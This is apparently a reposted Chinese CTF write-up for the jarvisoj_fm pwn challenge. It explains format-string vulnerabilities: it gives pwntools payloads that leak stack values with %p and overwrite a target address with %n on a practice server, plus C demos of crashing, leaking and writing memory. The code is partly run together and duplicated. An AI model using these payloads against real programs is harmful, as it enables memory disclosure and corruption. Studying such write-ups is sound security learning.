# 一道pwn题解析之jarvisoj_fm

> 原文: https://www.ctfiot.com/94853.html
> ID: 94853

本文为看雪论坛优秀文章

看雪论坛作者ID：404test

p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)PAYLOAD=b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"p.sendline(PAYLOAD)

p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)payload=b"%4c%13$n"p.sendline(payload+adrr)

printf("格式化字符串1，格式化字符串2",参数1，参数2...)%d - 十进制 - 打印十进制整数%s - 字符串 - 打印参数地址处的字符串%x,%X- 十六进制 - 打印十六进制数%o - 八进制 -打印八进制整形%c - 字符 - 打印字符%p - 指针 - 打印指针地址 即void *%n - 到目前为止所写的字符数%<正整数n>c 打印宽度为n的字符串（打印长度为n）

printf("%1234c%hhn",65,0x41414141);

栈区：该区域内存由系统自动分配，用于动态存储函数之间的调用关系。
堆区：该区域内存由进程利用相关函数或运算符动态申请，用完后释放并归还给堆区。例如，C语言中用malloc/free函数，C++语言中用new/delete运算符申请的空间就在堆区。
代码区：存放程序汇编后的机器代码和只读数据。
数据区：用于存储全局变量和静态变量。

#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s");
return 0;}

#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s%s%s");
return 0;}

在上述使程序崩溃的过程中我们使用了%s来打印栈空间内容作为地址的字符串，当控制栈空间上的内容为指向一个我们想要去查看内容的地址时，即可用%s进行查看。

如下

#include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74; //该值为字符串变量x在栈上的地址int b=2;
char x='h';printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s");
return 0;}

通过控制%s指向我们需要打印的内存空间的地址即可将其进行打印出来。其中重要的是找到存储任意内存地址在栈上与栈顶的偏移数量。确定偏移可以通过下方的泄漏栈空间内容的方法进行确定。

Eg:#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",a,b);
return 0;}

在printf函数中，当参数个数与格式化字符串不匹配时，将会从栈顶位置向栈底开始打印，将栈内的内容按照格式化字符串的要求打印出来，%p即是打印指针的地址，当存在参数a,和b时，即是打印a,和b所指向的空间的内容，超出部分默认将栈顶当做参数，打印其指向的栈顶地址的内容。

通过printf函数中控制%p的个数即可以泄漏栈的全部内容。

在printf函数中我们知道存在一个格式化字符串会向内存中写入数据，即是使用%n

它的功能是将%n之前打印出来的字符个数（四字节）写入参数地址处（赋值给一个变量）。在32位程序中需要的这个地址即是32位，在64位中地址需要为64位。

#include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74;
int b=2;
char x='h';printf("%10c%n",x,0x0012ff70);
return 0;}

看雪ID：404test

https://bbs.pediy.com/user-home-967279.htm

*本文由看雪论坛 404test 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)PAYLOAD=b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"p.sendline(PAYLOAD)
p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)payload=b"%4c%13$n"p.sendline(payload+adrr)
printf("格式化字符串1，格式化字符串2",参数1，参数2...)%d - 十进制 - 打印十进制整数%s - 字符串 - 打印参数地址处的字符串%x,%X- 十六进制 - 打印十六进制数%o - 八进制 -打印八进制整形%c - 字符 - 打印字符%p - 指针 - 打印指针地址 即void *%n - 到目前为止所写的字符数%<正整数n>c 打印宽度为n的字符串（打印长度为n）
printf("%1234c%hhn",65,0x41414141);
    #include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s");
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s%s%s");
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74; //该值为字符串变量x在栈上的地址int b=2;
char x='h';printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s");
return 0;}
Eg:#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",a,b);
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74;
int b=2;
char x='h';printf("%10c%n",x,0x0012ff70);
return 0;}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/0-1675211960.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/1-1675211960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/5-1675211961.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675211961.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675211961.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/9-1675211962.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/10-1675211962.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/5-1675211962.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675211963.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675211963.png)